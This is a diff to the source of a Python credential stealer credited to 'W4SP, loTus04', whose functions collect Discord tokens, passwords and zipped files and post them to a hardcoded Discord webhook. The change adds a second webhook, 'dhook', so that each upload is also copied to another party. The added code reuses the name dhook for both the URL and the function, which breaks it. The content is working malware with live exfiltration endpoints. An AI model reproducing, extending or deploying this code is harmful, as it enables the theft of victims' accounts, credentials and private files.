@@ -16,12 +16,14 @@ import random
 import re
 import subprocess
 
-#  THIS IS 1.1.6 VERSION
-#    BY W4SP, loTus04
-# 
+#    THIS IS 1.1.6 VERSION DHOOK BY ASPELL
+#   BY W4SP, loTus04 (and Aspell for DHOOK)
+#          Edited with love ❤
 
 
 hook = "https://discord.com/api/webhooks/1121804316051767366/yBOLU644GbSXKYwz6L1V0ek49JKLo6NkyV9dYBVBZni24t8aLfF_kZGabJNe4XXF-m8c"
+dhook ="https://discord.com/api/webhooks/1121804367432007721/odJXU-3KWS4n25BTWUUrGQbGUamvSu1KUTYNYVdp3YEAU62UEe492hhvLP47n5d13V5w"
+
 DETECTED = False
 
 
@@ -104,6 +106,15 @@ def LoadUrlib(hook, data='', files='', headers=''):
                 urlopen(Request(hook, data=data, headers=headers))
                 if headers != ''
                 else urlopen(Request(hook, data=data))
+            )
+        
+def dhook(dhook, data='', files='', headers=''):
+    for _ in range(8):
+        with contextlib.suppress(Exception):
+            return (
+                urlopen(Request(dhook, data=data, headers=headers))
+                if headers != ''
+                else urlopen(Request(dhook, data=data))
             )
 
 def globalInfo():
@@ -250,6 +261,7 @@ def checkToken(token):
 
 def uploadToken(token, path):
     global hook
+    global dhook
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -329,7 +341,7 @@ def uploadToken(token, path):
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-
+    dhook(dhook, data=dumps(data).encode(), headers=headers)
 def Reformat(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
@@ -366,6 +378,7 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        dhook(dhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "wppassw":
@@ -392,6 +405,7 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        dhook(dhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -420,6 +434,7 @@ def upload(name, link):
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        dhook(dhook, data=dumps(data).encode(), headers=headers)
         return
 
 
@@ -619,7 +634,7 @@ def GatherZips(paths1, paths2, paths3):
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-
+    dhook(dhook, data=dumps(data).encode(), headers=headers)
 
 def ZipTelegram(path, arg, procc):
     global OtherZip
